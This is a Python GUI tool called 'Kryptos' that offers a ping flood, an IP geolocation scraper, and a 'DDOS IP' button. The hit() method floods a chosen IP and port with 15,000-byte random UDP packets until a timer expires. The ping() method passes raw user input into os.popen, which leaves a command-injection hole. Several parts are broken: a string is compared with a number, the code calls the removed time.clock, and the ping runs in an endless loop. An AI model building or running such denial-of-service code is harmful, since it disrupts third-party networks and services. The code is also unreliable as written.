import functools
import os
import tkinter as tk
from concurrent import futures
import requests
import bs4
from bs4 import BeautifulSoup
import socket,random,sys,time


app = tk.Tk()
kryptos_graphic = '''
K  K RRRR  Y   Y PPPP  TTTTTT  OOO   SSS  
K K  R   R  Y Y  P   P   TT   O   O S     
KK   RRRR    Y   PPPP    TT   O   O  SSS  
K K  R R     Y   P       TT   O   O     S 
K  K R  RR   Y   P       TT    OOO  SSSS 
------------------------------------------
|           BY: ORANGEMAN                |
------------------------------------------
'''

thread_pool_executor = futures.ThreadPoolExecutor(max_workers=1)


def tk_after(target) :
    @functools.wraps(target)
    def wrapper(self, *args, **kwargs) :
        args = (self,) + args
        self.after(0, target, *args, **kwargs)

    return wrapper


def submit_to_pool_executor(executor) :
    def decorator(target) :
        @functools.wraps(target)
        def wrapper(*args, **kwargs) :
            return executor.submit(target, *args, **kwargs)

        return wrapper

    return decorator


class MainFrame(tk.Frame) :

    def __init__(self, *args, **kwargs) :
        super().__init__(*args, **kwargs)
        self.master.geometry('400x475')
        self.master.title("Kryptos")
        self.entry = tk.StringVar()
        self.port1 = tk.StringVar()
        self.duration = tk.StringVar()
        label = tk.Label(
            self.master, text="Enter target IP or host as required.", fg='black',bg='#00ff00')
        label.pack()
        entry = tk.Entry(self.master, textvariable=self.entry)
        entry.insert(-1, "1.1.1.1")
        entry.pack()
        port1 = tk.Entry(self.master, textvariable=self.port1)
        port1.insert(-1, '80')
        port1.pack()
        duration = tk.Entry(self.master, textvariable=self.duration)
        duration.insert(-1, '1000')
        duration.pack()
        self.button = tk.Button(
            self.master, text="Ping", command=self.on_button)
        self.button.pack()
        self.button2 = tk.Button(self.master, text='Geo IP Lookup', command=self.on_button2)
        self.button2.pack()
        self.button3 = tk.Button(self.master, text='DDOS IP',command=self.hit)
        self.button3.pack()
        self.text = tk.Text(self.master)
        self.text.config(state=tk.DISABLED)
        self.text.pack(padx=5, pady=5)
        self.master.configure(bg='#00ff00')





    @tk_after
    def button_state(self, enabled=True) :
        state = tk.NORMAL
        if not enabled :
            state = tk.DISABLED
        self.button.config(state=state)

    @tk_after
    def clear_text(self) :
        self.text.config(state=tk.NORMAL)
        self.text.delete(1.0, tk.END)
        self.text.config(state=tk.DISABLED)

    @tk_after
    def insert_text(self, text) :
        self.text.config(state=tk.NORMAL)
        self.text.insert(tk.END, text)
        self.text.config(state=tk.DISABLED)

    def on_button(self) :
        self.ping()

    def on_button2(self):
        self.lookup()



    @submit_to_pool_executor(thread_pool_executor)
    def ping(self) :
        self.button_state(False)
        self.clear_text()
        self.insert_text(kryptos_graphic)
        self.insert_text('Starting ping request')
        while True:
            result = os.popen("ping " + self.entry.get() + " -n 1000000")
            for line in result :
                self.insert_text(line)


        self.insert_text('ping request finished')
        self.button_state(True)

    @submit_to_pool_executor(thread_pool_executor)
    def lookup(self):
        try:
            ip = self.entry.get()
            base_site = 'https://whatismyipaddress.com/ip/'+ip
            response = requests.get(base_site)
            html = response.content
            soup = BeautifulSoup(html, 'lxml')
            tables = soup.find_all('tr')
            th = [table.find('th') for table in tables]
            td = [table.find('td') for table in tables]
            x = 0
            while x != 16:
                x += 1
                self.insert_text(th[x].text + td[x].text + '\n')
        except Exception as e:
            print(f'ERROR: {e}')
            time.sleep(3)

    @submit_to_pool_executor(thread_pool_executor)
    def hit(self):
        port = self.port1.get()

        ip = self.entry.get()

        dur = self.duration.get()

        clock = (lambda : 0, time.clock)[dur > 0]

        duration = (1, (clock() + dur))[dur > 0]

        self.insert_text(kryptos_graphic)



        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        bytes = random._urandom(15000)

        while True :


            if clock() < duration :

                sock.sendto(bytes, (ip, port))

            else :

                break

        print('Attack Finished')








if __name__ == '__main__' :
    main_frame = MainFrame()
    app.mainloop()